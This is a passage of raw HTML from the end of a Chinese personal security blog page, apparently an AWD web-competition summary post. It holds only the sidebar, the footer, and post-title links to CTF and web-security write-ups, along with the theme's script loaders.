href="/2022/11/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/" rel="bookmark" title="php反序列化">php反序列化</a></li><li><a href="/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/" rel="bookmark" title="php://filter过exit">php://filter过exit</a></li><li><a href="/2022/11/09/preg_match&&%E6%AD%A3%E5%88%99/" rel="bookmark" title="preg_match&&正则">preg_match&&正则</a></li><li><a href="/2023/03/01/nosql/" rel="bookmark" title="nosql学习笔记">nosql学习笔记</a></li><li><a href="/2023/03/20/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="bookmark" title="主动信息收集">主动信息收集</a></li><li><a href="/2023/03/20/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="bookmark" title="被动信息收集">被动信息收集</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">54</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">12</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">39</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Vulnhub/" title="分类于 Vulnhub">Vulnhub</a></div><span><a href="/2023/07/14/easy_cloudantivirus%E9%9D%B6%E6%9C%BA%E6%94%BB%E5%87%BB%E8%AE%B0%E5%BD%95/" title="记一次easy_cloudantivirus打靶记录">记一次easy_cloudantivirus打靶记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/09/23/%E5%9F%BA%E4%BA%8Esql-labs%E9%9D%B6%E5%9C%BA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E8%BF%9B%E9%98%B6%E7%AF%87/" title="基于sqli-labs进阶学习">基于sqli-labs进阶学习</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WP/" title="分类于 WP">WP</a></div><span><a href="/2023/06/01/ISCC2023/" title="ISCC2023">ISCC2023</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/09/23/%E5%9F%BA%E4%BA%8Esqli-labs%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AF%87/" title="基于sqli-labs前20关的SQL注入学习">基于sqli-labs前20关的SQL注入学习</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2023/02/15/php%E7%89%B9%E6%80%A7/" title="CTFshow-web入门php特性">CTFshow-web入门php特性</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%BA%94%E7%94%A8/" title="分类于 网络服务应用">网络服务应用</a></div><span><a href="/2022/11/03/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/" title="DNS服务器">DNS服务器</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/" title="php:&#x2F;&#x2F;filter过exit">php://filter过exit</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WP/" title="分类于 WP">WP</a></div><span><a href="/2023/04/05/GKCTF2020/" title="GKCTF2020WP">GKCTF2020WP</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="分类于 数据结构">数据结构</a></div><span><a href="/2022/10/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/" title="数据结构与算法入门">数据结构与算法入门</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/11/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/" title="php反序列化">php反序列化</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">578k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">8:45</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2022/10/24/awd-web小结/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->
